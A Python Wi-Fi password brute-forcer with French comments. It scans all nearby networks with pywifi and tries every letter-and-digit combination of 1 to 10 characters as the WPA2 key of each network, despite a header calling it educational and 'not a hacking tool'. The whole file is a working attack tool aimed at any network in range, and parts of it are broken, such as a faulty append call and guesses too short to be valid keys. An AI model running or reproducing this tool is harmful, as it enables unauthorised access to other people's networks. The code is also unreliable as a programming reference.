# NOTE THIS IS FOR EDUCATIONAL PURPOSES ONLY
# THIS IS NOT A HACKING TOOL
# - BETA V0.1 [Optimization and bug fixes in the next update]

import os
try:
    import pywifi
    from pywifi import const
    from pywifi import PyWiFi
    from pywifi import Profile
except:
    os.system("pip install pywifi")
    os.system("pip install comtypes")
    os.system("pip install iface")

# DEMARRAGE DU PROGRAMME
wifi = PyWiFi()
i=0
interface = wifi.interfaces()[i]
interface.scan()
reseaux = interface.scan_results()
while True:
    try:
        interface += wifi.interfaces()[i]
        interface.scan()
        reseaux += interface.scan_results()
        i+=1
    except:
        break
print("Liste des reseaux disponibles :")
for reseau in reseaux:
    print("Nom : " + reseau.ssid)
    print("Adresse : " + reseau.bssid)
    print("Signal : " + str(reseau.signal))
    print("Type de securite : " + str(reseau.akm))
    print("Type de chiffrement : " + str(reseau.cipher))
    print("")

def bruteforce(interface, reseau, motdepasse):
    profile = Profile()
    profile.ssid = reseau
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = motdepasse
    interface.remove_all_network_profiles()
    tmp_profile = interface.add_network_profile(profile)
    interface.connect(tmp_profile)
    if interface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False
ListReseauEtMDP = []

def attaquePasswd(nombreReseau, tabCarac):
        passwd = ""
        for i in range(len(tabCarac)):
            passwd = tabCarac[i]
            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                print("Mot de passe trouve : " + passwd)
                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])   
                return True

        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                passwd = tabCarac[i] + tabCarac[j]
                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                    print("Mot de passe trouve : " + passwd)
                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
                    return True

        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k]
                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                        print("Mot de passe trouve : " + passwd)
                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
                        return True

        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l]
                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                            print("Mot de passe trouve : " + passwd)
                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
                            return True

        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m]
                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                print("Mot de passe trouve : " + passwd)
                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
                                return True
        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            for n in range(len(tabCarac)):
                                passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n]
                                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                    print("Mot de passe trouve : " + passwd)
                                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
                                    return True   
        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            for n in range(len(tabCarac)):
                                for o in range(len(tabCarac)):
                                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o]
                                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                        print("Mot de passe trouve : " + passwd)
                                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
                                        return True   
        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            for n in range(len(tabCarac)):
                                for o in range(len(tabCarac)):
                                    for p in range(len(tabCarac)):
                                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p]
                                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                            print("Mot de passe trouve : " + passwd)
                                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
                                            return True  
        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            for n in range(len(tabCarac)):
                                for o in range(len(tabCarac)):
                                    for p in range(len(tabCarac)):
                                        for q in range(len(tabCarac)):
                                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p] + tabCarac[q]
                                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                                print("Mot de passe trouve : " + passwd)
                                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
                                                return True
        for i in range(len(tabCarac)):
            for j in range(len(tabCarac)):
                for k in range(len(tabCarac)):
                    for l in range(len(tabCarac)):
                        for m in range(len(tabCarac)):
                            for n in range(len(tabCarac)):
                                for o in range(len(tabCarac)):
                                    for p in range(len(tabCarac)):
                                        for q in range(len(tabCarac)):
                                            for r in range(len(tabCarac)):
                                                passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p] + tabCarac[q] + tabCarac[r]
                                                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
                                                    print("Mot de passe trouve : " + passwd)
                                                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
                                                    return True  


def iterationPasswd():
    tabCarac = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    passwd = ""
    for nombreReseau in range(len(reseaux)):
        attaquePasswd(nombreReseau, tabCarac)
        # print("Mot de passe non trouve pour le réseau :",reseaux(nombreReseau))
    print(ListReseauEtMDP)
iterationPasswd()
